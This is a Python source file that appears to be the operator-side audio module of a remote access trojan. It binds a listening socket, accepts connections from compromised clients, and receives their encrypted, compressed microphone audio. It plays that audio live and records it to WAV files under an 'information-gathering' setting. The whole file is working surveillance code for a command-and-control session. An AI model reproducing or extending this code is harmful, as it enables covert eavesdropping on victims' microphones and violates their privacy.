import threading
import pyaudio
import pickle
import zlib
import sys

from domestic.parse.internal_server_error_exception_handling import *
from domestic.parse.error_exception_handling import *
from domestic.utility.validate_dict_key import *
from domestic.session.session_message import *
from domestic.utility.status_message import *
from domestic.modules.socket_handler import *
from domestic.utility.write_error import *
from domestic.make.make_wave import *
from domestic.global_state import *


@internal_server_error_exception_handling
def audio_action(write_stream):
  try:
    headersize = state['settings']['headersize']
    encryption = state['settings']['encryption']
    encoding = state['settings']['encoding']
    username = state['session']['username']
    mode = [True, 0, b'']
    frames = []

    p = pyaudio.PyAudio()
    CHUNK = 81920
    FORMAT = pyaudio.paInt16
    RATE = 44100
    CHANNELS = 2

    try:
      stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
    except:
      CHANNELS = 1
      stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
      
    record = state['options']['information-gathering']['record']['audio']
    client, addr = state['sockets']['modules']['audio'][0].accept()
    client_obj = (client, username, addr)
    state['sockets']['modules']['audio'][1].append(client_obj)

    message = pickle.dumps(b' ')
    message = zlib.compress(message, 1)
    message = encryption.do_encrypt(message)
    final_msg = bytes(f'{len(message):<{headersize}}', encoding) + message
    client.send(final_msg)

    while True:
      client_msg = client.recv(81920)

      if mode[0]:
        mode[1] = int(client_msg[:headersize])
        mode[0] = False

      mode[2] += client_msg

      if len(mode[2])-headersize == mode[1]:
        frame = encryption.do_decrypt(mode[2][headersize:])
        frame = zlib.decompress(frame)
        frame = pickle.loads(frame)

        if write_stream is None:
          stream.write(frame)

        frames.append(frame)

        real_msg = pickle.dumps(b' ')
        real_msg = zlib.compress(real_msg, 1)
        real_msg = encryption.do_encrypt(real_msg)
        final_msg = bytes(f'{len(real_msg):<{headersize}}', encoding) + real_msg
        client.send(final_msg)
        
        mode = [True, 0, b'']
  except Exception as err:
    write_error(err)
    try:
      if record:
        make_wave(['modules', 'modules/audio'], client_obj[1], (CHANNELS, p, FORMAT, RATE, frames))

      stream.stop_stream()
      stream.close()
      p.terminate()
      state['sockets']['modules']['audio'][1].remove(client_obj)
    except Exception as err:
      write_error(err)
    finally:
      sys.exit(0)


@error_exception_handling
def audio(data):
  ip = validate_dict_key(data, 'ip')
  port = validate_dict_key(data, 'port')
  run = validate_dict_key(data, 'run')
  quiet = validate_dict_key(data, 'quiet')
  unbind = validate_dict_key(data, 'unbind')
  close = validate_dict_key(data, 'close')
  status = validate_dict_key(data, 'status')

  if run:
    assert state['session']['active']

    if ip and port:
      data['ip'], data['port'] = ip, int(port)
    else:
      data['ip'], data['port'] = state['sockets']['modules']['audio'][0].getsockname()

    if quiet:
      del data['quiet']
      
    del data['run']

    threading.Thread(target=audio_action, args=(quiet,), daemon=True).start()
    session_message(data)
  elif ip and port:
    if state['sockets']['modules']['audio'][0] is None:
      bind_socket(ip, port, 'audio')
    else:
      ip, port = state['sockets']['modules']['audio'][0].getsockname()
      status_message(f'You are already listening for clients (audio module) on {ip}:{port}', 'danger', {'dots': True})
  elif unbind:
    if state['sockets']['modules']['audio'][0]:    
      unbind_socket('audio')
    else:
      status_message(f'You\'re not listening for clients (audio module)\nThere is no server socket (audio module) to close', 'warning')
  elif close:
    close_client(close, 'audio')
  elif status:
    if state['sockets']['modules']['audio'][0]:
      ip, port = state['sockets']['modules']['audio'][0].getsockname()
      status_message(f'You are listening for clients (audio module) on {ip}:{port}', 'primary')
    else:
      status_message('You are not listening for clients (audio module)', 'warning')
  else:
    raise Exception('Error message')